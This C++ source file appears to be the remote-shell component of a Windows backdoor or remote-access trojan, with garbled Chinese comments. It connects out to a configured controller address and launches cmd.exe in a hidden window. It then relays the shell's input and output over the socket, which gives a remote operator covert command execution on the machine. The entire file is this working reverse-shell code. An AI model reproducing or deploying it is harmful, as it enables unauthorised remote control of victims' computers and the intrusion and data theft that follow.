#include "CmdManage.h"
#include <Windows.h>
#include "ConnectInfo.h"
#include <string.h>

BOOL RecvKeyInfo();


SOCKET MainSocket;



HANDLE m_hReadPipeHandle;   
HANDLE m_hWritePipeHandle; 
HANDLE m_hReadPipeShell;
HANDLE m_hWritePipeShell;

HANDLE m_hProcessHandle;
HANDLE m_hThreadHandle;
HANDLE m_hThreadRead;
HANDLE m_hThreadMonitor;
HANDLE hWirteConsoleThread;
HANDLE hReadConsoleThread;


int End;

DWORD __stdcall CmdManageThread(LPVOID lparam)//�̴߳���Cmd ����
{

	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr= inet_addr(ConnectInfo::getConnectInfo()->ipAddress);

	MainSocket = socket(AF_INET, SOCK_STREAM, 0);//���½���һ��ר�ŵ�socket�Ϳͻ��˽��н���
	if(connect(MainSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
	{
		closesocket(MainSocket);
		return 0;//connect error
	}

	//======================���ʹ����ض�cmd shell����===============================
	MsgHead msgHead;


	//send socket type 
	msgHead.dwCmd = CMD_SHELLDLG_SHOW;
	msgHead.dwSize = 0;
	if(!SendMsg(MainSocket, NULL, &msgHead))
	{
		closesocket(MainSocket);

		return 0; 
	}

	End = 0;



	SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};

	m_hReadPipeHandle	= NULL;
	m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
	m_hWritePipeShell	= NULL;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL; 
	sa.bInheritHandle = TRUE;


	if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
		return 0;
	}

	if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
		if(m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
		return 0;
	}

	memset((void *)&si, 0, sizeof(si));
	memset((void *)&pi, 0, sizeof(pi));


	GetStartupInfo(&si);


	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdInput  = m_hReadPipeShell;//cmd�������½���ͨ����ȡ�ܵ�������Ϊ����
	si.hStdOutput = si.hStdError = m_hWritePipeShell; //cmd�������½���ͨ��д��ܵ���Ϊ���


	GetSystemDirectoryA(strShellPath, MAX_PATH);

	strcat(strShellPath,"\\cmd.exe");


	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{

		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return 0;
	}
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;



	/**************************��ȡcmd shell ���ݷ��͸����ض�*******************************/
	//�����߳̽������ض˷�����������д��shell��
	hWirteConsoleThread = CreateThread(NULL, 0,  WriteConsoleThread, &m_hProcessHandle, 0, NULL);


	hReadConsoleThread = CreateThread(NULL, 0, ReadConsoleThread, NULL, 0, NULL);



	HANDLE hThread[2];
	hThread[0] = hWirteConsoleThread;
	hThread[1] =hReadConsoleThread;
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	TerminateThread(hWirteConsoleThread, 0);
	TerminateProcess(hReadConsoleThread, 1);
	CloseHandle(pi.hProcess); 
	CloseHandle(pi.hThread);
	return 0;
}




DWORD WINAPI WriteConsoleThread(LPVOID lparam)
{
	HANDLE hProcess = (*(HANDLE*)lparam);
	char *pWriteBuffer = new char[10000];
	while(!End)
	{
		memset(pWriteBuffer, 0, 10000);
		MsgHead msg;
		if(!RecvMsg(MainSocket, pWriteBuffer, &msg))
		{
			Clear();
			delete pWriteBuffer;
			return 0;
		}
		if(msg.dwCmd == 88)
		{
			Clear();
		    delete pWriteBuffer;
			TerminateProcess(hProcess, 1);	
			return 0;
		}
		int nSize = msg.dwSize;
		unsigned long	ByteWrite;
		WriteFile(m_hWritePipeHandle, pWriteBuffer, nSize, &ByteWrite, NULL);////////////////// m_hWritePipeHandle
	}
	delete pWriteBuffer;
	return 0;
}


DWORD WINAPI ReadConsoleThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	int bufsize = 10000;
	char	*pReadBuffer = new  char [10000]; 
	DWORD	TotalBytesAvail;
	while (!End)
	{
		Sleep(100);
		while (PeekNamedPipe(m_hReadPipeHandle, pReadBuffer, bufsize, &BytesRead, &TotalBytesAvail, NULL)) 
		{
			if (BytesRead <= 0)
				break;
			memset(pReadBuffer, 0, bufsize);
			ReadFile(m_hReadPipeHandle, pReadBuffer, TotalBytesAvail, &BytesRead, NULL); 
			MsgHead msg;
			msg.dwSize = strlen(pReadBuffer);
			if(!SendMsg(MainSocket, pReadBuffer, &msg))
			{
				Clear();
				delete pReadBuffer;
				return 0;
			} 
		}
	}
	delete pReadBuffer;
	return 0;
}



void Clear()
{	
	closesocket(MainSocket);
	CloseHandle( m_hReadPipeHandle);
	CloseHandle( m_hWritePipeHandle); 
	CloseHandle( m_hWritePipeShell);
	CloseHandle( m_hReadPipeShell);
	End = 1;
}